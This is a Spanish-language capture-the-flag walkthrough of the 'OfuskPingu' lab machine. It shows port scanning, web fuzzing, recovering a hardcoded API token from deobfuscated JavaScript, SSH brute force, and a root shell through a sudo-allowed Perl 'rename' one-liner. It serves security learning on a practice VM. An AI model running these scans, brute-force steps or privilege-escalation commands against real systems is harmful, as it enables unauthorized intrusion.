
# Writeup Template: Maquina `[ OfuskPingu ]`
- **Escaneo de puertos TCP**: Detección de servicios accesibles mediante escaneo a ciegas.
- **Enumeración de servicios**: Análisis de los servicios activos y sus características.
- **Fuzzing de rutas web**: Descubrimiento de archivos y rutas ocultas mediante ataques automatizados.
- **Desofuscación de código JavaScript**: Análisis de scripts ocultos para extraer lógica sensible o claves.
- **Interacción con APIs protegidas**: Acceso condicionado a rutas especiales mediante tokens o claves validadas.
- **Obtención de credenciales de acceso**: Derivación o fuerza bruta de credenciales para acceso remoto.
- **Escalada de privilegios mediante binario autorizado**: Abuso de permisos especiales para obtener acceso de administrador.

- Tags: #OfuskiPingu #rename
- Dificultad: `[ Media ]`
- Plataforma: `[ The Hackers Labs ]`

---
## Configuracion del Entorno
**Nota:** Pagina oficcioal donde descargo los laboratorios: [The Hackers Labs](https://labs.thehackerslabs.com/)
- Descargamos el archivo **( .ova )**
- Descomprimimos el archivo **zip**
- Importamos el **ova** en **virtualBox**

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
# Realizamos descubrimiento del target
sudo arp-scan -I wlan0 --localnet --ignoredups

192.168.100.32 PCS Systemtechnik GmbH
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 192.168.100.32
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 192.168.100.32
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 192.168.100.32 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.100.32 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80,3000 192.168.100.32 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
3000/tcp open  http    Node.js Express framework
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://192.168.100.32
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://192.168.100.32
http://192.168.100.32 [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[192.168.100.32], Script, Title[Ofuscación de Código JavaScript | Seguridad en APIs]
```
### Descubrimiento de Archivos y Rutas
```bash
gobuster dir -u http://192.168.100.32/ -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/script.js            (Status: 200) [Size: 1492]
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque

Tenemos un archivo **js** el cual nos traemos a nuestra maquina para analizarlo
```bash
curl -s -X GET http://192.168.100.32/script.js -o script.js
```

### Packing/Unpacking
El código se empaqueta dentro de una función que lo desempaqueta y ejecuta al momento de cargarse. A menudo usa `eval()` o `Function`.
Usamos este [HerramientaOnly](https://lelinhtinh.github.io/de4js/) para desofuscar el codigo
```bash
function inicializarAplicacion() {
    const API_KEY_SECRETA = configParts.map(part => part.toLowerCase()).join('');
    const appConfig = {
        version: '1.0.3',
        entorno: 'produccion',
        apiEndpoint: 'https://adivinaadivinanza/v3',
        credenciales: {
            usuario: 'jeje',
            acceso: API_KEY_SECRETA.split('').reverse().join('') + '123'.split('').reverse().join('')
        },
        features: {
            darkMode: true,
            analytics: false
        }
    };
    const conectarAPI = () => {
        const claveFinal = appConfig.credenciales.acceso.slice(0, -3).split('').reverse().join('');
        console.log('Conectando a la API con clave:', claveFinal);
        return {
            status: 200,
            message: 'Conexión exitosa',
            token: btoa(claveFinal + ':' + 'admin')
        }
    };
    if (window.location.hostname === 'secretazosecreton') {
        setTimeout(() => {
            const conexion = conectarAPI();
            console.log('Resultado conexión:', conexion)
        }, 3000)
    }
}
document.addEventListener('DOMContentLoaded', () => {
    inicializarAplicacion();
    const buttons = document.querySelectorAll('button');
    buttons.forEach(btn => {
        btn.addEventListener('click', () => {
            console.log('Botón clickeado')
        })
    })
});

function validarClave(a) {
    const claveReal = 'QWERTYCHOCOLATITOCHOCOLATONCHINGON';
    return a === claveReal
}
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        validarClave
    }
}
```

Probamos diferentes metodos para el puerto 3000 que viene referenciado en el codigo js
```bash
curl -s -X GET http://192.168.100.32:3000
curl -s -X POST http://192.168.100.32:3000
curl -s -X PUT http://192.168.100.32:3000
```

Realizamos fuzzing de rutas
```bash
gobuster dir -u http://192.168.100.32:3000/ -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 40 -x php,php.back,backup,txt,sh,html,js,java,py
```

Tenemos una carpeta:
```bash
/view                 (Status: 400) [Size: 22]
/public               (Status: 301) [Size: 156] [--> /public/]
/api                  (Status: 400) [Size: 34]
```

Al realizar la peticion a esta ruta, nos responde con lo siguiente
```http
curl -s -X GET http://192.168.100.32:3000/api
{"error":"Parámetro incorrecto."}
```

Probamos el **apiToken** que obtuvimos de esta funcion
```js
function validarClave(a) {
    const claveReal = 'QWERTYCHOCOLATITOCHOCOLATONCHINGON';
    return a === claveReal
}
```
### Ejecucion del Ataque
```bash
# Comandos para explotación
curl -s -X GET http://192.168.100.32:3000/api?token=QWERTYCHOCOLATITOCHOCOLATONCHINGON
{"key":"MI-KEY-SECRETA-12345"}
```

Ahora realizamos la peticion a la siguiente ruta
```bash
curl -s -X GET http://192.168.100.32:3000/view
Parámetro incorrecto. 
```

**Nota** Este es el ejemplo de como encontrar el parametro valido: Necesitamos un parametro, que lo buscamos con la herramienta **wfuzz**
```bash
wfuzz -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -u "http://192.168.100.32:3000/view?FUZZ=MI-KEY-SECRETA-1234" --hh=21
```

Tenemos el parametro valido:
```http
000001690:   403        0 L      7 W        45 Ch       "key"
```

```bash
curl -s -X GET http://192.168.100.32:3000/view?key=MI-KEY-SECRETA-12345 -o zona_secreta.html
```

Revisando el codigo tenemos un usuario valido para el sistema: **debian**
```html
<div class="container">
    <h1 class="glow">🎉 ¡Bienvenido a la Zona Secreta! 🎉</h1>
    <p>Has accedido correctamente al área privada del sistema.<br>Ahora debes entrar por SSH con debian usando alguna contraseña.</p>
    <button class="btn" onclick="salir()">Cerrar Sesión</button>
</div>
```

### Intrusion
Realizamos ataque de fuerza bruta por ssh
```bash
[22][ssh] host: 192.168.100.32   login: debian   password: chocolate
```

Realizamos la  conexion por **ssh**
```bash
# Reverse shell o acceso inicial
ssh debian@192.168.100.32
debian@192.168.100.32's password:
```

---

## Escalada de Privilegios

###### Usuario `[ Debian ]`:
Flag de usuario
```bash
debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
```

listando los permisos para este usuario
```bash
sudo -l

User debian may run the following commands on OfusPingu:
    (ALL) NOPASSWD: /usr/bin/rename
```

El binario **`/usr/bin/rename`** en Kali Linux es una herramienta poderosa para renombrar archivos, y con privilegios **sudo NOPASSWD** puede ser explotado para ganar acceso root.
Es un utilitario para **renombrar múltiples archivos** usando expresiones regulares. Parte del paquete `rename` en Debian/Kali.
Para ver si este binario es de **perl**, necesitamos ver su primera linea
```bash
debian@OfusPingu:~$ head -n 1 /usr/bin/rename

#!/usr/bin/perl
```

como `head` mostró `#!/usr/bin/perl` significa que es la **implementación Perl** de `rename` (aka `prename`). Esa versión evalúa una expresión Perl que tú le pasas, y si la ejecutas con `sudo` como root puedes ejecutar código Perl arbitrario
Con eso puedes obtener **una shell root inmediata**
- `BEGIN{...}` es un bloque Perl que se ejecuta antes de procesar archivos.
- `system("/bin/sh")` lanza un shell (`/bin/sh`) **como root**
```bash
# Comando para escalar al usuario: ( root )
sudo /usr/bin/rename 'BEGIN{system("/bin/sh")}' /tmp/dummy
```

---

## Evidencia de Compromiso
Flag de **root**
```bash
# ls -l /root/root.txt
-rw-r--r-- 1 root root 32 Jun  7 12:11 /root/root.txt
```


```bash
# Captura de pantalla o output final
# echo -e "[*] Pwned: $(whoami)"
-e [*] Pwned: roo
```
